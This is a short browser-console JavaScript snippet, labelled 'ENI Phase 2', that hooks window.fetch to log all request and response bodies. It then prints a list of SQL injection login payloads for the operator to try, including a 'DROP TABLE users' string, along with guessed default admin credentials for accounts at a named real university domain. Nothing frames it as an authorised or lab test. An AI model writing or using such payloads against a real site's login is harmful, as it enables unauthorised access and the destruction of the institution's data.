// ENI Phase 2: Full Response Capture + SQLi Probe
window._origFetch = window.fetch;
window.fetch = function(...args) {
  const [url, options] = args;
  const urlStr = url.toString ? url.toString() : url;
  const method = options?.method || 'GET';
  
  console.log(`%c[ENI] ${method} ${urlStr}`, 'color: #2f6fce; font-weight: bold;');
  
  return window._origFetch(...args).then(async r => {
    // Clone the response so we can read the body AND return it
    const clone = r.clone();
    let bodyText = '';
    try {
      bodyText = await clone.text();
      // Try to parse as JSON for pretty printing
      const json = JSON.parse(bodyText);
      console.log(`%c[ENI BODY] ${r.status}`, 'color: #a66b18;', json);
    } catch(e) {
      console.log(`%c[ENI BODY] ${r.status}`, 'color: #a66b18;', bodyText.substring(0, 500));
    }
    
    return r;
  });
};

// SQL Injection test payloads
const payloads = [
  { email: "test@test.com' OR '1'='1", password: "anything" },
  { email: "test@test.com'--", password: "anything" },
  { email: "test@test.com'; DROP TABLE users;--", password: "anything" },
  { email: "admin@rupp.edu.kh", password: "password123" },
  { email: "admin@cs.rupp.edu.kh", password: "password123" },
  { email: "' OR 1=1--", password: "anything" },
];

console.log('%c[ENI] Ready. Now try signing in with any of these emails:', 'color: #2f6fce; font-size: 14px; font-weight: bold;');
payloads.forEach((p, i) => {
  console.log(`  ${i+1}. ${p.email}`);
});